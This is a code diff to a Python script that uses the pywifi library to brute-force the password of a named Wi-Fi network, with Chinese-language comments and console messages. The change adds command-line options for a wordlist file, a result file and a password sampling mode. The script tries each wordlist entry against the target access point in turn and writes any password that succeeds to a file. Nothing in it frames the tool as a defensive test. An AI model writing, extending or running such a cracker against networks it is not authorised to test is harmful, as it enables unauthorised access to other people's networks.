@@ -1,9 +1,15 @@
+import os
+
 import pywifi
 from pywifi import const  # 引用一些定义
 
-from _util import *
+from _util import get_aps, crack_ap, sample_passwords
 
-def main(ssid):
+
+def main(password_file, ssid, result_file='results.txt', stype=0):
+    if not os.path.isfile(password_file):
+        print('[!]密码本文件不存在')
+        return
 
     print('[+]获取网卡')
     wifi = pywifi.PyWiFi()  # 抓取网卡接口
@@ -16,7 +22,7 @@ def main(ssid):
     
     print('[+]导入密码本')
     passwords = []
-    with open('password.txt') as f:
+    with open(password_file) as f:
         for line in f:
             passwords.append(line.strip())
     print('[-]成功导入密码本')
@@ -35,15 +41,16 @@ def main(ssid):
 
     profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元 /cipher - AP的密码类型
 
-    for key in passwords:
+    for key in sample_passwords(passwords, stype):
         print('[+]使用密码 %s 破解 %s' % (key, ssid))
 
         profile.key = key
 
         if crack_ap(iface, profile):
-            with open('crack_result.txt', 'a') as f:
+            with open(result_file, 'a') as f:
                 f.write('%s : %s\n' % (ssid, key))
             print('[-]使用密码 %s 破解 %s成功' % (key, ssid))
+            print('[*]结果保存在文件 % s中'%result_file)
             break
         else:
             print('[-]使用密码 %s 破解 %s失败' % (key, ssid))
@@ -55,10 +62,14 @@ def __main__():
     import argparse
 
     parser = argparse.ArgumentParser(description='暴力破解指定SSID的热点')
-    parser.add_argument('ssid', type=str, help='SSID 名称')
+    parser.add_argument('password_file', type=str, help='密码本文件')
+    parser.add_argument('ssid', type=str, help='所要破解的 SSID 名称')
+    parser.add_argument('--result_file', type=str, default='results.txt', help='保存所有热点密码结果文件')
+    parser.add_argument('-s', '--stype', type=int, default=0,
+                        help=sample_passwords.__doc__)
     args = parser.parse_args()
 
-    main(args.ssid)
+    main(args.password_file, args.ssid, args.result_file, args.stype)
 
 if __name__ == '__main__':
     __main__()
